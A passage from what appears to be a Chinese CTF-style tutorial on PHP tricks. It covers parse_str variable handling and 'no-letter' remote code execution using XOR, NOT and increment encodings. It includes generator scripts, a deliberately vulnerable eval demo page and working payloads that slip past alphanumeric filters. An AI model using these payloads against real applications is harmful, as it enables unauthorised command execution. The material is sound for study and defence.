<p>首先我们payload:<code>?_POST[&#39;key1&#39;]=36d&amp;_POST[&#39;key2&#39;]=36d</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662970495963-a75793d2-e054-4af6-8a5a-661fb2861ac5.png#averageHue=%23f9f8f8&clientId=u33e7e59a-e6c3-4&from=paste&height=254&id=E2VrC&name=image.png&originHeight=317&originWidth=927&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22262&status=done&style=none&taskId=u7c72b5ed-2fec-40b6-851b-8dfb163774f&title=&width=741.6" alt="image.png"><br>首先单引号被转成了%27(自动转），前面一切正常<br>注意 ‘’key1’’ &#x3D;&gt; string ‘36d’ <em>(length&#x3D;3)</em>       ‘’key2’’ &#x3D;&gt; string ‘36d’ <em>(length&#x3D;3)</em><br>这里他的键的名字是<code>&#39;key1&#39;</code>他把单引号也算成了名字，这时候我还很疑惑到底是怎么回事，我们平常给数组取键名都是带单引号的呀</p>
<p>猜想是parse_str自动把URL编码解码了：<br>换一个代码测试一下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="string">&quot;a=1%26b=2%26c=3&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>())</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>其中%26是&amp;<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662970773370-fe5f69e1-9746-4889-9157-613b2b57ce8f.png#averageHue=%23fdfcfc&clientId=u33e7e59a-e6c3-4&from=paste&height=199&id=X1DSv&name=image.png&originHeight=249&originWidth=1122&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6662&status=done&style=none&taskId=uf9d23bd7-98c9-443e-8723-e036aac9fa0&title=&width=897.6" alt="image.png"><br>可以看到在最后这个a被注册成了一个变量，值是<code>1&amp;b=2&amp;c=3</code><br><strong>首先函数会自动解码URL编码，这一点确信了</strong><br>诶？真是奇怪，不是说&amp;是分隔符吗？是不是这么想的<br>实际上我们传入%26进去，<strong>函数以为我们的意思是让%26解码后作为变量的值</strong></p>
<p>parse_str中&amp;怎么当分隔符？：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="string">&quot;a=1&amp;b=2&amp;c=3&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这种情况结果为：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1662970902092-8f2bc51a-b3da-46ac-8830-90595c18396f.png#averageHue=%23f1f0f0&clientId=u33e7e59a-e6c3-4&from=paste&height=75&id=Ca8Nu&name=image.png&originHeight=94&originWidth=344&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3271&status=done&style=none&taskId=uf2aa8c53-fc61-4a9d-a61f-297c3c44670&title=&width=275.2" alt="image.png"><br>可以看到a,b,c均被注册，所以说&amp;要在源代码中才可以起分隔符的作用！<br>我们URL去传&amp;假如不编码会被认为要传入多个变量<br>假如编码也发挥不了作用<br>结束！</p>
<h2 id="7-无字母RCE的一些思考"><a href="#7-无字母RCE的一些思考" class="headerlink" title="7.无字母RCE的一些思考"></a>7.无字母RCE的一些思考</h2><p>首先参考yu的文章：</p>
<h3 id="按位异或，按位与，按位或"><a href="#按位异或，按位与，按位或" class="headerlink" title="按位异或，按位与，按位或"></a>按位异或，按位与，按位或</h3><p><strong>取反，按位，都需要PHP7环境！！！！！！（MUST）</strong><br>麻，以按位疑惑为例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;text.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);  <span class="comment">//新创建一个文件，也就是rce_or.txt，给他写的权限</span></span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>); <span class="comment">//ascii的前16个字符的十六进制应该是01，02，所以在前缀加‘0’</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);  <span class="comment">//前16个后面的就不用加0了</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);   <span class="comment">//同理上方</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);      <span class="comment">//同理上方</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> =<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;     <span class="comment">//如果有符合条件的就筛掉，输出空格</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;             <span class="comment">//可以使用的字符如下</span></span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;    <span class="comment">//十六进制前加百分号就变成了URL编码格式</span></span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));  <span class="comment">//urldecode函数是解URL编码，把他们变成字符串，这里是字符串进行按位或运算，按位或运算后，可以得到新的字符，如%21和%00进行按位或就变成了!,这样我们就可以使用感叹号,就类似于合成新的字符</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;          <span class="comment">//ord函数是将字符变成ASCII码</span></span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;     <span class="comment">//每次到这里都写入刚刚建立的文本内</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;text.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()  <span class="comment"># 逐行读取文件 //每一次循环，指针都会指向下一行，输出下一行的字符</span></span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:  <span class="comment"># 读到空，即读完跳出循环</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:  <span class="comment"># 就比如我们这边输入的arg是system，当文本当前行第一个字母是s或者y这些字符就写入s1,s2</span></span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]  <span class="comment"># 提取第一个字符串，具体可以看上面我的截图，如第一行的%00</span></span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]  <span class="comment"># 提取第二个字符串</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span>  <span class="comment"># s1和s2进行或运算就可以合成对应的字母s,y,s,t,e,m</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function:&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command:&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
<p>首先来讲一下原理把：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;     <span class="comment">//如果有符合条件的就筛掉，输出空格</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;             <span class="comment">//可以使用的字符如下</span></span><br><span class="line">     <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;    <span class="comment">//十六进制前加百分号就变成了URL编码格式</span></span><br><span class="line">     <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">     <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));  <span class="comment">//urldecode函数是解URL编码，把他们变成字符串，这里是字符串进行按位或运算，按位或运算后，可以得到新的字符，如%21和%00进行按位或就变成了!,这样我们就可以使用感叹号,就类似于合成新的字符</span></span><br></pre></td></tr></table></figure>
<p>主要的PHP代码在这里，这段代码的意思是利用hex2bin来获取filter以外的字符，如空白字符，一些乱码之类的，但是这些字符都有对应的二进制数字，所以可以进行取反，异或之类的操作</p>
<p>举个栗子吧，以脚本生成的结果中调几个来看：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663142741114-b517bb91-ec1d-4567-8924-e86dd168783e.png#averageHue=%23313a44&clientId=ub21a85e0-a72d-4&from=paste&height=98&id=XV3hI&name=image.png&originHeight=123&originWidth=548&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9279&status=done&style=none&taskId=u8fb62d18-b383-46c6-bbff-50458c05cd5&title=&width=438.4" alt="image.png"><br>看到92行，意思就是%04|%27的结果URL解码后就是#<br>在本地测试一下看看：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;04&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;27&#x27;</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%04&#x27;</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%27&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span>	</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663142785772-2de865ca-77cc-45d7-8e36-0fb0892eca4d.png#averageHue=%23f0d2a9&clientId=ub21a85e0-a72d-4&from=paste&height=123&id=GSkZJ&name=image.png&originHeight=154&originWidth=665&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5409&status=done&style=none&taskId=u5447eabd-2313-4487-9717-f045a025dad&title=&width=532" alt="image.png"><br>从结果来看就是那些满足filter条件的字符，不是数字也不是字母，是一些特殊符号和乱码，如果filter中过滤了特殊符号，那就修改一下脚本即可</p>
<p>用两个乱码合成了一个#，可以这么理解<br>最后再来谈谈结果的原理：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663144215469-e6fdd440-fa2b-4481-a8b4-49db0ba5982e.png#averageHue=%232f2e2c&clientId=ub21a85e0-a72d-4&from=paste&height=80&id=Zekgu&name=image.png&originHeight=100&originWidth=666&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11318&status=done&style=none&taskId=u4dd11ff6-c8e6-402e-a3cc-b54a8a7fcbb&title=&width=532.8" alt="image.png"><br>(“%0f%08%0f%09%0e%06%0f”^”%7f%60%7f%60%60%60%60”)(“%0b”^”%3a”)<br>就好比我们的system(‘ls)，我们看看这一堆东西输入进去后为什么会变成答案？<br>首先URL会帮你解码一次，我感到好奇的是双引号的作用，本地测试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$code</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们payload：?code&#x3D;(“%0f%08%0f%09%0e%06%0f”^”%7f%60%7f%60%60%60%60”)(“%0b”^”%3a”);<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663144327500-64b12fb2-956e-4a74-bda5-99f968815624.png#averageHue=%23dabc87&clientId=ub21a85e0-a72d-4&from=paste&height=550&id=RAK7O&name=image.png&originHeight=687&originWidth=1838&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69132&status=done&style=none&taskId=u0c262b63-201a-411f-a94d-7c85309017c&title=&width=1470.4" alt="image.png"><br>看得到结果输出的code是一滩乱码，这是因为被URL解码过了，由于这些乱码我们都没过滤，所以可以满足条件<br>猜测是在eval内完成了异或的操作<br>本地测试一下能否进行异或操作：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0f%08%0f%09%0e%06%0f&quot;</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%7f%60%7f%60%60%60%60&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0b&quot;</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%3a&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span>   </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663144676865-2ef501a3-117a-4947-abf7-c0ef689f49e5.png#averageHue=%23f1da94&clientId=ub21a85e0-a72d-4&from=paste&height=191&id=PF9Xf&name=image.png&originHeight=239&originWidth=558&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3489&status=done&style=none&taskId=u612d7cb7-ac6d-42ca-ba32-bb04d02b6e5&title=&width=446.4" alt="image.png"><br>是可行的，都解出来了，这样对原理就清楚了</p>
<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>在php内取反很方便，因为php内可以取反字符串，而在python内就显得麻烦的多，取反脚本如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>意思就是先对输入的字符串进行取反，我们payload时二次取反达到还原的目的，<br>了解一下取反的原理：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> ~<span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663144838161-ea6cf0ab-4edf-499d-8149-ec49f8d35b7a.png#averageHue=%23f8fbe5&clientId=ub21a85e0-a72d-4&from=paste&height=110&id=nWSeq&name=image.png&originHeight=137&originWidth=465&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4192&status=done&style=none&taskId=uda8643ff-4496-4368-9728-90151ee16bc&title=&width=372" alt="image.png"><br>可以看到是乱码！所以可以绕过preg_match的过滤，我们把这乱码二次取反后：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=~<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> ~<span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663144895232-845cf66c-62f8-4e07-b6cd-d228fa5e39bf.png#averageHue=%23f0f1f2&clientId=ub21a85e0-a72d-4&from=paste&height=69&id=s99vb&name=image.png&originHeight=86&originWidth=325&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2379&status=done&style=none&taskId=u45b5b519-2325-4427-83ec-c49de3e9bcd&title=&width=260" alt="image.png"><br>可以还原，和上面的异或其实是一个意思</p>
<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>参考以上文章</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].[]; <span class="comment">//俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;&#x27;</span>;  <span class="comment">//两个短杠赋值为空</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>];<span class="comment">//从arrayarray中取首字符，即a。这里$_=$_[0]也是一样的道理，不过waf限制数字输入</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//b</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//c</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//d</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//e</span></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>; <span class="comment">//E  把两个短杠赋值为E</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//F  一个短杠继续自增</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//G </span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$__</span>; <span class="comment">// GE  一个短杠自增变成了G，两个短杠在前面第十一行处已经赋值为E，拼接得GE</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//H 此处一个短杠继续自增，为H</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//I</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//J</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//k</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//L</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//M</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//N</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//P</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//Q</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//S</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//T</span></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>; <span class="comment">// GET 在此处，两条短杠原是GE与一条短杠（已经自增为T），.=拼接，构成get</span></span><br><span class="line">$&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>&#125;[_]($&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>&#125;[__]); <span class="comment">// 进行拼接，$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span></span><br><span class="line"></span><br><span class="line">url编码后：</span><br><span class="line">%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">5</span>b%<span class="number">5</span>d.%<span class="number">5</span>b%<span class="number">5</span>d%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">27</span>%<span class="number">27</span>%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">5</span>b%<span class="number">27</span>%<span class="number">27</span>%<span class="number">5</span>d%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__.%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_.%<span 